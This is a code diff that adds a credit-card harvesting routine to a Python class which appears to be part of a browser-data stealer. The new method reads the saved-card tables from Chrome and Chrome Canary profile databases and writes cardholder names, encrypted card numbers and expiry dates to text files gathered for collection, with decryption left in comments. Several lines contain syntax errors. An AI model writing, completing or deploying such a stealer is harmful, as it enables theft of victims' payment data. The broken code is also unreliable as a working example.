@@ -74,6 +74,7 @@ class chromium():
                     self.web_history,
                     self.search_history,
                     self.bookmarks,
+                    self.credit_cards
                 ]
 
             for profile in self.profiles:
@@ -235,3 +236,87 @@ class chromium():
                         f.write("URL: {}\n".format(item['url']))
 
         os.remove('bookmarks.json')
+       
+    def credit_cards(self, profile: str, working_dir: str) -> None:
+        target = 'Web Data'
+        chrome_user_data = ntpath.join(
+            'Google', 'Chrome', 'User Data')
+        chrome_key = self.get_master_key(
+            ntpath.join(self.chrome_user_data, "Local State"))
+        chrome_reg = re.compile(
+            r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)
+
+        chrome_user_dataEXP = ntpath.join(
+            'Google' 'Chrome SxS', 'User Data')
+
+
+        if os.path.exists(chrome_user_data):
+            
+            self.files.append('\\credit-cards.txt')
+
+            with open(working_dir + '\\credit-cards.txt'), 'w', encoding="cp437") as f:  # errors='ignore')
+
+                for prof in os.listdir(chrome_user_data):
+
+                    if match(chrome_reg, prof):
+
+                        db = ntpath.join(chrome_user_data, prof, target)
+
+                        conn = sqlite3.connect(db)
+                        cursor = conn.cursor()
+                        cursor.execute(
+                            "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year, date_modified FROM credit_cards")
+
+                        for r in cursor.fetchall():
+                            NameONCC = r[0]
+                            Card_Num = r[1]
+                            Exp_Mnth = r[2]
+                            Exp_YR = r[3]
+                            Exp = f"{Exp_Mnth}/{Exp_YR}"
+                            LM = r[4]
+                            # Card_Num = self.decrypt_val(Encrypted_Card_Num, self.chrome_key)
+                            f.write(
+                                f"Name on CC: {NameONCC} | Card Number: {Card_Num} | Exp: {Exp} | Last Modified: {LM}")
+
+                        cursor.close()
+                        conn.close()
+                        # os.remove(login)
+
+                f.close()
+        else:
+            pass
+
+        if os.path.exists(chrome_user_dataEXP):
+            
+            self.files.append('\\credit-cards-canary.txt')
+
+            with open('\\credit-cards-canary.txt'), 'w', encoding="cp437") as f:  # errors='ignore')
+
+                for prof in os.listdir(chrome_user_dataEXP):
+
+                    if match(chrome_reg, prof):
+
+                        db = ntpath.join(
+                            chrome_user_dataEXP, prof, target)
+
+                        conn = sqlite3.connect(db)
+                        cursor = conn.cursor()
+                        cursor.execute(
+                            "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year, date_modified FROM credit_cards")
+
+                        for r in cursor.fetchall():
+                            NameONCC = r[0]
+                            Card_Num = r[1]
+                            Exp_Mnth = r[2]
+                            Exp_YR = r[3]
+                            Exp = f"{Exp_Mnth} || {Exp_YR}"
+                            LM = r[4]
+                            # Card_Num = self.decrypt_val(Encrypted_Card_Num, self.chrome_key)
+                            f.write(
+                                f"Name on CC: {NameONCC} | Card Number: {Card_Num} | Exp: {Exp} | Last Modified: {LM}")
+
+                        cursor.close()
+                        conn.close()
+                f.close()
+        else:
+            pass
